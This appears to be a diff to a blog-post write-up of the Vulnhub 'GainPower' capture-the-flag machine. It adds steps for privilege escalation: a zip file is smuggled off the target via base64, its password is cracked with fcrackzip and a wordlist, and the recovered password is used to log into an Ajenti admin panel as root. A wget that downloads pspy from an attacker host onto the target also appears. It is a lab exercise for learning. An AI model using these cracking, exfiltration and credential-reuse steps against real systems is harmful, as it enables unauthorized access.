@@ -3,7 +3,7 @@ title: Vulnhub - GainPower
 description: My writeup on GainPower box.
 categories:
  - vulnhub
-tags: vulnhub
+tags: vulnhub ajenti pspy ssh bash sudo bruteforce zip fcrackzip
 ---
 
 ![](https://static.vecteezy.com/system/resources/previews/000/602/897/non_2x/creative-power-logo-concept-design-templates-vector.jpg)
@@ -147,7 +147,7 @@ Password:
 programmer
 ```
 
-Bingo now for the next privesc we need [pspy](https://github.com/DominicBreuker/pspy){:target="_blank"} to deleted the cronjob!
+Bingo now for the next privesc we need [pspy](https://github.com/DominicBreuker/pspy){:target="_blank"} to detect the cronjob!
 
 ```
 -bash-4.2$ wget -q 192.168.1.16/pspy64; chmod +x pspy64
@@ -194,6 +194,52 @@ drwxr-xr-x. 185 root    root  8192 Aug  7  2019 ..
 -rw-r--r--.   1 root    root   439 Aug  8  2019 secret.zip
 ```
 
-Let's move it in our system.
+Let's move it in our system, i'll use python.
 
+```
+[vanshal@192 ~]$ python -c 'print(__import__("base64").b64encode(open("secret.zip", "rb").read()))'    
+UEsDBBQACQAIAEZ/CE8bl3q88wAAAAEBAAAPABwATXlwYXNzd29yZHMudHh0VVQJAAM7+UtdO/lLXXV4CwABBAAAAAAEAAAAAP0agjAMjKZhvP07KcMXCksRBGNPumnw1+WzmH0A6WJi4NzTK2Bc+QF3o55OB8LrH93KzHHBN2liC9qzC4WEvGaRPgz1neLzTunx5sJdWmvvxNQwVUAn79eNkgd+YB2qTrJKTeQGxRr/d93Lw/R9NG3ngkkV7V3Uvepfw85DUK6eHmKRBE7LRqOunxTCvoMUyzToBvt1PNThvRnRxn7D8jAlaqs/tu9ayBLdbgz7r4G1gdULP7PckBI9AgGpenq8ZjHESWo2a21FqrSTicvOPKZGTVBTNlng+v27QF19rj6JgYxgvv0TLVh8Cy8AzBTEoOJkNVBLBwgbl3q88wAAAAEBAABQSwECHgMUAAkACABGfwhPG5d6vPMAAAABAQAADwAYAAAAAAABAAAApIEAAAAATXlwYXNzd29yZHMudHh0VVQFAAM7+UtddXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEAVQAAAEwBAAAAAA==
+```
 
+```
+$ cat - > zip.txt 
+UEsDBBQACQAIAEZ/CE8bl3q88wAAAAEBAAAPABwATXlwYXNzd29yZHMudHh0VVQJAAM7+UtdO/lLXXV4CwABBAAAAAAEAAAAAP0agjAMjKZhvP07KcMXCksRBGNPumnw1+WzmH0A6WJi4NzTK2Bc+QF3o55OB8LrH93KzHHBN2liC9qzC4WEvGaRPgz1neLzTunx5sJdWmvvxNQwVUAn79eNkgd+YB2qTrJKTeQGxRr/d93Lw/R9NG3ngkkV7V3Uvepfw85DUK6eHmKRBE7LRqOunxTCvoMUyzToBvt1PNThvRnRxn7D8jAlaqs/tu9ayBLdbgz7r4G1gdULP7PckBI9AgGpenq8ZjHESWo2a21FqrSTicvOPKZGTVBTNlng+v27QF19rj6JgYxgvv0TLVh8Cy8AzBTEoOJkNVBLBwgbl3q88wAAAAEBAABQSwECHgMUAAkACABGfwhPG5d6vPMAAAABAQAADwAYAAAAAAABAAAApIEAAAAATXlwYXNzd29yZHMudHh0VVQFAAM7+UtddXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEAVQAAAEwBAAAAAA==
+^C
+$ base64 -d zip.txt > secret.zip
+$ file secret.zip 
+secret.zip: Zip archive data, at least v2.0 to extract
+$ unzip secret.zip 
+Archive:  secret.zip
+[secret.zip] Mypasswords.txt password: 
+```
+
+We have to crack it, i'll use my favorite tool `fcrackzip`.
+
+```
+$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret.zip 
+
+PASSWORD FOUND!!!!: pw == 81237900
+$ unzip -P 81237900 secret.zip 
+Archive:  secret.zip
+  inflating: Mypasswords.txt         
+$ cat Mypasswords.txt 
+aTQ!vYxQUh3$&uaN3p%@_ax#Ab2XNZ!5$rFh$@bDMyxt#&Q2L&4+DvDT?A!MPKK9sFq-V8_d$5gQLKyKhf-4&S=_m^Cx?bZYf8Bv%%*H^GcvDc4ayfPk^HWs8bnD%Ayk3$5WP6_K?a6_%MF&e-DS2ZZ$m93BL3CY!huQDM2-JZcMSMKT8K*Z7zLPGATU7JP&x#JtaZHAbM^%$TK%C3ubXV4#e87M6P-puXTTMbzuP5y4qX6Uzd%ed8Ux_vMX=pCB
+```
+
+Now we can use this password on port `8000` there `ajenti` is running, a web based system management control panel. Default username is `root` let's give it a go :
+
+`root:aTQ!vYxQUh3$&uaN3p%@_ax#Ab2XNZ!5$rFh$@bDMyxt#&Q2L&4+DvDT?A!MPKK9sFq-V8_d$5gQLKyKhf-4&S=_m^Cx?bZYf8Bv%%*H^GcvDc4ayfPk^HWs8bnD%Ayk3$5WP6_K?a6_%MF&e-DS2ZZ$m93BL3CY!huQDM2-JZcMSMKT8K*Z7zLPGATU7JP&x#JtaZHAbM^%$TK%C3ubXV4#e87M6P-puXTTMbzuP5y4qX6Uzd%ed8Ux_vMX=pCB`
+
+We're in follow my steps for command execution :
+
+![](https://i.imgur.com/hgUTexA.png)
+
+![](https://i.imgur.com/5XgDu3Q.png)
+
+![](https://i.imgur.com/GDSiBEV.png)
+
+Let's read the flag.
+
+![](https://i.imgur.com/v5hmRKC.png)
+
+Took me long time.. but was fun in the end. :)
